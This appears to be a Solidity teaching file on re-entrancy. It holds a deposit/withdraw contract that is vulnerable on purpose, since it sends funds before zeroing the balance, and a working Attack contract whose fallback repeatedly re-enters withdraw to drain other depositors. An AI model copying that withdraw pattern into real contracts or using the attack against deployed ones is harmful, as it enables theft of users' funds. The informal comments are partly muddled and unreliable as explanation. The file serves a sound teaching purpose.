//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    /*
Re-Entrancy
VULNERABILITY
Let's say that contract A calls contract B.
RE-ENTRACY exploit allows B to call back into A before A finishes execution.
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack, BECAUSE:
1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/
/*Create a mapping whose key is address and value is uint and the name is balances.
Make it public.*/
contract tech4dev{
    mapping(address => uint)  public balances;
//create a function that would allow user deposit ether into a smart contract
/*msg.value is number of wei/ether sent with the transaction
 
*/
    function deposit() public payable{
        balances[msg.sender] += msg.value;
        // can also be balances[msg.sender] = balances[msg.sender] + msg.value; 
    }
    //Create a function for users to withdraw.
    function withdraw() public{
    //require(balances[msg.sender] >= amount, "insufficient funds");
  uint bal = balances[msg.sender];
  require (bal > 0);
 //we call use send, transfer or call. msg.sender is the address of the caller, balance is going to the address of the caller
  (bool sent, ) = msg.sender.call{value: bal}(""); //: means what is after the column is what will be the value
        require(sent, "Failed to send Ether/Error/Failed");
         balances[msg.sender] = 0;
 }
 /*function withdraw() public {

        uint bal = balances[msg.sender];

        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");

        require(sent, "Failed to send Ether");



        balances[msg.sender] = 0;

    } */

/* function to check the balance of this contract
address(this).balance will return the balance stored at the address of contract. */
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
  /*  A scenerio btw 3 individuals who have decided to contribute money to a contract
  reentrance is reentring the withdrawal over and over again
  */
}
contract Attack{
    tech4dev public etherStore;  //name of the contract to attack is tech4dev. here etherStore is a variable
    constructor(address _etherStoreAddress) {
        etherStore = tech4dev(_etherStoreAddress);
    }

    
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) { //check if the balance of the contract we are attacking is >= 1
            etherStore.withdraw();  //if it is then we call function withdraw. Here we are calling the function etherStore
        }
    }
    /* Ones you call function attack, somethings will happen, first is deposit them immediately you call the witdrawal 
    function, then it will check do you av balance, is it greater than 0? then the money will be sent to the person 
    calling the function...the money will go to the person calling the function attack, as the money is reaching the 
    fallback function, instead of the fall back function to leave it alone, cos of the bad intention you are calling 
    the withdrawal function and it will call the function again and then require or confirm weda your bnalance is still 
    greater than 0, hence the execution is still going on and there is still access to the withdrawal functiom and the 
    person will be able to withdraw due to the access 
    why is it not executing line 16 & 17 is cos as it went to the fall back function we did not allow it chance to finish executing and we already called the witdrawal function
    The major thing we are trying to do is reentrancy, we are entering and entering without llowing the full code to execute.  The attack is the person lauching the attack using the deposit function, that is why he is deposition alongside others. So what to sk is, what will be withdrawal function do? The withdrawal function is being called. Once it is called and requirement of bal are meant it will send your deposit back to you. When the witdrawal is going on,  under contract attact it will go to the fall back cos that is the function calling it, and this can be done continuously cos the processs is still ongoing. Ans this is why it will go and affect another deposit not yours
    it can only be stopped if the balances after withdraw is reached and since it is not passing withdrawal the thread keeps going and it is not allowed to reach get balance
    */

        function attack() external payable{
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
    // Help function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    }
